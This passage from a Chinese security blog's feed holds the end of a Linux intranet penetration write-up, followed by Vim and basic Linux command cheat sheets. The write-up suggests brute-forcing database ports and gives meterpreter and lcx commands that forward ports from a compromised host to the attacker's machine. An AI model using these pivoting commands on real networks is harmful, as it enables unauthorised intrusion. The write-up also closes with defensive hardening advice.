<h3 id="针对其他端口的入侵"><a href="#针对其他端口的入侵" class="headerlink" title="针对其他端口的入侵"></a>针对其他端口的入侵</h3><p>　　除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。</p>
<h3 id="针对web服务的入侵"><a href="#针对web服务的入侵" class="headerlink" title="针对web服务的入侵"></a>针对web服务的入侵</h3><p>　　除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。</p>
<h3 id="端口转发的逆袭"><a href="#端口转发的逆袭" class="headerlink" title="端口转发的逆袭"></a>端口转发的逆袭</h3><p>　　前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？<br>　　事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。</p>
<h4 id="meterpreter实现端口转发"><a href="#meterpreter实现端口转发" class="headerlink" title="meterpreter实现端口转发"></a>meterpreter实现端口转发</h4><p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。<br>发现攻击机上监听了2222端口，连接到了本机其外一个高端口。<br><img src="/upload_image/20170809/4.png" alt=""><br>肉鸡的22端口也连接到了肉鸡自己的一个高端口<br><img src="/upload_image/20170809/5.png" alt=""><br>那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。</p>
<h4 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h4><p>攻击机:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 2222 3333 <span class="comment"># 2222为转发端口，3333为本机任意未被占用的端口</span></div></pre></td></tr></table></figure></p>
<p>肉鸡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 110.1.1.1 2222 127.0.0.1 3389</div></pre></td></tr></table></figure></p>
<p>110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。</p>
<h3 id="内网嗅探"><a href="#内网嗅探" class="headerlink" title="内网嗅探"></a>内网嗅探</h3><p>　　windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。</p>
<h3 id="linux内网安全建议"><a href="#linux内网安全建议" class="headerlink" title="linux内网安全建议"></a>linux内网安全建议</h3><p>说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法，可以一起留言讨论。</p>
<ul>
<li>每台服务器上安装监控软件，监控并拦截木马程序的运行（监控木马文件以及行为）</li>
<li>监控服务器上开启的新端口，查看其连接情况，是否有异常连接（监控异常端口）</li>
<li>服务器及时更新补丁，以及最新系统漏洞补丁（减少漏洞）</li>
<li>服务器上运行的应用给予低权限（增加提权的难度）</li>
<li>不必要连接外网的服务器，禁止连接外网（减少被入侵的风险）</li>
<li>日志记录并且实时监控（监控异常操作以及暴力破解行为）</li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://bobao.360.cn/learning/detail/4164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4164.html</a><br><a href="http://bobao.360.cn/learning/detail/3204.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3204.html</a><br><a href="http://www.freebuf.com/sectool/56432.html" target="_blank" rel="external">http://www.freebuf.com/sectool/56432.html</a><br><a href="http://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/125278.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Nothing great was ever achieved without enthusiasm&lt;br&gt;无热情成就不了伟业&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="内网渗透" scheme="http://thief.one/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】Vim使用</title>
    <link href="http://thief.one/2017/08/09/1/"/>
    <id>http://thief.one/2017/08/09/1/</id>
    <published>2017-08-09T07:53:58.000Z</published>
    <updated>2017-08-31T06:53:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">The secret of success is constancy of purpose<br>成功的秘诀在于持之于恒<br></blockquote><br>　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。<br><a id="more"></a><br><img src="/upload_image/20170809/6.png" alt=""></p>
<h3 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yy  <span class="comment"># 复制一行</span></div><div class="line">dd  <span class="comment"># 剪切一行</span></div><div class="line">p   <span class="comment"># 粘贴</span></div></pre></td></tr></table></figure>
<h3 id="查找单词"><a href="#查找单词" class="headerlink" title="查找单词"></a>查找单词</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:/nmask <span class="comment"># 查找存在nmask字符串的位置</span></div><div class="line">或者</div><div class="line">bin/bash&gt;:?nmask <span class="comment"># 查找存在nmask字符串的位置</span></div></pre></td></tr></table></figure>
<p>继续查找下一个存在nmask字符串的位置</p>
<ul>
<li>n 往上查找</li>
<li>N 往下查找</li>
</ul>
<h3 id="编辑器显示设置"><a href="#编辑器显示设置" class="headerlink" title="编辑器显示设置"></a>编辑器显示设置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:<span class="built_in">set</span> nu!        <span class="comment"># 显示行号</span></div><div class="line">:<span class="built_in">set</span> autoindent <span class="comment"># 自动缩进</span></div><div class="line">:syntax <span class="built_in">enable</span>  <span class="comment"># 语法高亮</span></div></pre></td></tr></table></figure>
<h3 id="文件内容定位"><a href="#文件内容定位" class="headerlink" title="文件内容定位"></a>文件内容定位</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gg              <span class="comment"># 首行</span></div><div class="line">G               <span class="comment"># 末行</span></div><div class="line">XG              <span class="comment"># 定位到第X行</span></div><div class="line">或者：</div><div class="line">bin/bash&gt;：10   <span class="comment"># 定位到第10行</span></div></pre></td></tr></table></figure>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">o <span class="comment"># 在当前行下插入一行</span></div></pre></td></tr></table></figure>
<h3 id="保存退出"><a href="#保存退出" class="headerlink" title="保存退出"></a>保存退出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ZZ <span class="comment"># 保存退出</span></div><div class="line">ZQ <span class="comment"># 不保存退出</span></div><div class="line">bin/bash&gt;：w　filename   <span class="comment"># 另存为</span></div></pre></td></tr></table></figure>
<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:％s/regexp/replacement/g   <span class="comment"># 文本中所有匹配的都替换</span></div></pre></td></tr></table></figure>
<h3 id="行内移动"><a href="#行内移动" class="headerlink" title="行内移动"></a>行内移动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">（  <span class="comment"># 移动到句首</span></div><div class="line">）  <span class="comment"># 移动到句尾</span></div></pre></td></tr></table></figure>
<h3 id="vim保存没有权限的文件"><a href="#vim保存没有权限的文件" class="headerlink" title="vim保存没有权限的文件"></a>vim保存没有权限的文件</h3><h4 id="文件只读"><a href="#文件只读" class="headerlink" title="文件只读"></a>文件只读</h4><p>使用:w!强制写入<br>或者:set noreadonly然后只要使用正常的:w</p>
<h4 id="不能写，但有sudo权限。"><a href="#不能写，但有sudo权限。" class="headerlink" title="不能写，但有sudo权限。"></a>不能写，但有sudo权限。</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:w !sudo tee %</div></pre></td></tr></table></figure>
<p>这是一个接收管道信息并可以写入文件的命令。</p>
<h4 id="无权写入该文件，没有管理员权限sudo"><a href="#无权写入该文件，没有管理员权限sudo" class="headerlink" title="无权写入该文件，没有管理员权限sudo"></a>无权写入该文件，没有管理员权限sudo</h4><p>使用:w! ~/tempfile.ext将更改写入临时文件，然后采取措施将临时文件移动到目录(将临时文件发送到目录所有者/管理员)。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;The secret of success is constancy of purpose&lt;br&gt;成功的秘诀在于持之于恒&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="vim" scheme="http://thief.one/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>【玩转Linux系列】Linux基础命令</title>
    <link href="http://thief.one/2017/08/08/1/"/>
    <id>http://thief.one/2017/08/08/1/</id>
    <published>2017-08-08T12:21:20.000Z</published>
    <updated>2017-09-22T05:03:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">即使跌倒了，你要懂得抓一把沙子在手里。<br></blockquote><br>　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。<br><a id="more"></a></p>
<h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><h4 id="解析命令的意思-whatis、info"><a href="#解析命令的意思-whatis、info" class="headerlink" title="解析命令的意思(whatis、info)"></a>解析命令的意思(whatis、info)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">whatis whoami 解析命令的意思</div><div class="line">info whoami   详细解析命令的意思</div></pre></td></tr></table></figure>
<h4 id="寻找命令的安装路径-which、whereis"><a href="#寻找命令的安装路径-which、whereis" class="headerlink" title="寻找命令的安装路径(which、whereis)"></a>寻找命令的安装路径(which、whereis)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> whoami  寻找命令的位置</div><div class="line">whereis whoami 寻找程序的位置</div></pre></td></tr></table></figure>
<h3 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h3><h4 id="目录查看-ls"><a href="#目录查看-ls" class="headerlink" title="目录查看(ls)"></a>目录查看(ls)</h4><p>查看目录结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tree</div></pre></td></tr></table></figure></p>
<p>查看当前目录下所有子文件夹排序后的大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh `ls` | sort</div></pre></td></tr></table></figure></p>
<p>查看目录下文件个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ | wc -l</div></pre></td></tr></table></figure></p>
<p>按时间排序，以列表的方式显示目录项<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -lrt</div></pre></td></tr></table></figure></p>
<p>给每项文件前面增加一个id编号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls | cat -n</div></pre></td></tr></table></figure></p>
<h4 id="文件目录权限-chmod、chown"><a href="#文件目录权限-chmod、chown" class="headerlink" title="文件目录权限(chmod、chown)"></a>文件目录权限(chmod、chown)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">改变文件的拥有者 chown</div><div class="line">改变文件读、写、执行等属性 chmod</div><div class="line">递归子目录修改： chown -R tuxapp <span class="built_in">source</span>/</div><div class="line">增加脚本可执行权限： chmod a+x myscript</div></pre></td></tr></table></figure>
<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="文件创建删除-touch、echo、rm-f"><a href="#文件创建删除-touch、echo、rm-f" class="headerlink" title="文件创建删除(touch、echo、rm -f)"></a>文件创建删除(touch、echo、rm -f)</h4><p>删除日志文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm *<span class="built_in">log</span> (等价: <span class="variable">$find</span> ./ -name “*<span class="built_in">log</span>” -<span class="built_in">exec</span> rm &#123;&#125; ;)</div></pre></td></tr></table></figure></p>
<h4 id="文件查看-du-sh"><a href="#文件查看-du-sh" class="headerlink" title="文件查看(du -sh)"></a>文件查看(du -sh)</h4><p>查看文件大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh  文件名</div></pre></td></tr></table></figure></p>
<p>统计文件行数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wc -l test.txt</div></pre></td></tr></table></figure></p>
<h4 id="文件内容查看-cat、head、tail"><a href="#文件内容查看-cat、head、tail" class="headerlink" title="文件内容查看(cat、head、tail)"></a>文件内容查看(cat、head、tail)</h4><p>显示时同时显示行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat -n  （如：cat test.txt | cat -n）</div></pre></td></tr></table></figure></p>
<p>正向逆向查看文件内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">head -1 filename <span class="comment"># 第1行内容</span></div><div class="line">tail -5 filename <span class="comment"># 倒数5行内容</span></div></pre></td></tr></table></figure></p>
<h4 id="文件搜索-find"><a href="#文件搜索-find" class="headerlink" title="文件搜索(find)"></a>文件搜索(find)</h4><p>linux 复制特定后缀文件（保持目录结构）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar cvf my_txt_files.tar `find . -<span class="built_in">type</span> f -name <span class="string">"*.jsp*"</span>`</div></pre></td></tr></table></figure></p>
<p>递归当前目录及子目录并删除所有.log文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ -name <span class="string">"*.log"</span> -<span class="built_in">exec</span> rm &#123;&#125; \;</div></pre></td></tr></table></figure></p>
<p>否定参数查找所有非txt文本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . ! -name <span class="string">"*.txt"</span> -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<p>按类型搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -<span class="built_in">type</span> d -<span class="built_in">print</span>  //只列出所有目录</div></pre></td></tr></table></figure></p>
<p>最近7天内被访问过的所有文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime -7 -<span class="built_in">type</span> f -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容搜索-grep"><a href="#文件内容搜索-grep" class="headerlink" title="文件内容搜索(grep)"></a>文件内容搜索(grep)</h4><p>查看成功登陆ssh的IP地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">centos</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/secure* | grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div><div class="line"></div><div class="line">ubuntu：</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/auth.log* |grep <span class="string">'Accepted'</span> |grep ftp| grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>递归目录搜索返回文本内容存在class字符串的行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep <span class="string">"class"</span> . -R -n</div></pre></td></tr></table></figure></p>
<p>非匹配(-v)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep -v <span class="string">"python"</span>  <span class="comment">#匹配除了python进程</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容排序-sort"><a href="#文件内容排序-sort" class="headerlink" title="文件内容排序(sort)"></a>文件内容排序(sort)</h4><ul>
<li>-n 按数字进行排序 VS -d 按字典序进行排序</li>
<li>-r 逆序排序</li>
<li>-k N 指定按第N列排序</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sort -nrk 1 data.txt</div><div class="line">sort -bd data // 忽略像空格之类的前导空白字符</div></pre></td></tr></table></figure>
<h4 id="消除重复行-uniq"><a href="#消除重复行-uniq" class="headerlink" title="消除重复行(uniq)"></a>消除重复行(uniq)</h4><p>消除重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq</div></pre></td></tr></table></figure></p>
<p>统计各行在文件中出现的次数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -c</div></pre></td></tr></table></figure></p>
<p>找出重复行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sort unsort.txt | uniq -d</div></pre></td></tr></table></figure></p>
<h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><p>查看磁盘空间利用大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">df -h</div></pre></td></tr></table></figure></p>
<p>挂载U盘<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fdisk -l 查看U盘路径</div><div class="line">monut /dev/sdb4 /mnt  挂载U盘</div><div class="line"><span class="built_in">cd</span> /mnt 进入U盘</div><div class="line">umount /mnt  退出U盘</div></pre></td></tr></table></figure></p>
<h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>杀死python相关的进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep python | cut -d <span class="string">' '</span> -f 2 | xargs <span class="built_in">kill</span></div><div class="line">或者</div><div class="line">pkill -9 python  <span class="comment">#-9表示强制删除，pkill以进程名字匹配</span></div></pre></td></tr></table></figure></p>
<p>查看进程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | less</div></pre></td></tr></table></figure></p>
<p>查看端口占用的进程状态：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsof -i:3306</div></pre></td></tr></table></figure></p>
<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><p>查看网络连接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -an | less</div></pre></td></tr></table></figure></p>
<p>查看网络路由<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route -n</div></pre></td></tr></table></figure></p>
<p>只查看ip信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig | grep inet</div></pre></td></tr></table></figure></p>
<h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><p>查看系统位数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>查看系统版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -a</div></pre></td></tr></table></figure></p>
<p>查看hosts文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/hosts</div></pre></td></tr></table></figure></p>
<p>查看CPU的核的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/cpuinfo | grep processor | wc -l</div></pre></td></tr></table></figure></p>
<p>查看系统信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">uname -m 显示机器的处理器架构</div><div class="line">uname -r 显示正在使用的内核版本</div><div class="line">cat /proc/cpuinfo 显示CPUinfo的信息</div><div class="line">cat /proc/meminfo 校验内存使用</div><div class="line">cat /proc/version 显示内核的版本</div><div class="line">cat /proc/net/dev 显示网络适配器及统计</div><div class="line">cat /proc/mounts 显示已加载的文件系统</div></pre></td></tr></table></figure></p>
<h3 id="性能管理"><a href="#性能管理" class="headerlink" title="性能管理"></a>性能管理</h3><h4 id="CPU-sar"><a href="#CPU-sar" class="headerlink" title="CPU(sar)"></a>CPU(sar)</h4><p>查看CPU使用率<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -u</div></pre></td></tr></table></figure></p>
<p>查看CPU平均负载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sar -q 1 2</div></pre></td></tr></table></figure></p>
<h4 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h4><p>查看内存使用情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sar -r 1 2</div><div class="line">或者</div><div class="line">free -m</div></pre></td></tr></table></figure></p>
<h4 id="网络流量监控-iftop"><a href="#网络流量监控-iftop" class="headerlink" title="网络流量监控(iftop)"></a>网络流量监控(iftop)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iftop -i eth1 -B <span class="comment">#-i 指定网卡，-B以byte显示，可以使用-h查看帮助信息</span></div></pre></td></tr></table></figure>
<h4 id="网络流量-dstat"><a href="#网络流量-dstat" class="headerlink" title="网络流量(dstat)"></a>网络流量(dstat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dstat</div></pre></td></tr></table></figure>
<h3 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h3><h4 id="管道和重定向-、-、-amp-amp-、-gt-、-gt-gt"><a href="#管道和重定向-、-、-amp-amp-、-gt-、-gt-gt" class="headerlink" title="管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)"></a>管道和重定向(|、||、&amp;&amp;、&gt;、&gt;&gt;)</h4><ul>
<li>批处理命令连接执行，使用 |</li>
<li>串联使用分号 ;</li>
<li>前面成功，则执行后面一条，否则不执行:&amp;&amp;</li>
<li>前面失败，则后一条执行: ||</li>
<li><em>&gt;</em>覆盖原有内容</li>
<li><em>&gt;&gt;</em>文件后追加内容</li>
</ul>
<p>重定向<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt; test.txt <span class="comment">#覆盖原有内容</span></div><div class="line"><span class="built_in">echo</span> <span class="built_in">test</span> &gt;&gt; test.txt <span class="comment">#文件后追加内容</span></div></pre></td></tr></table></figure></p>
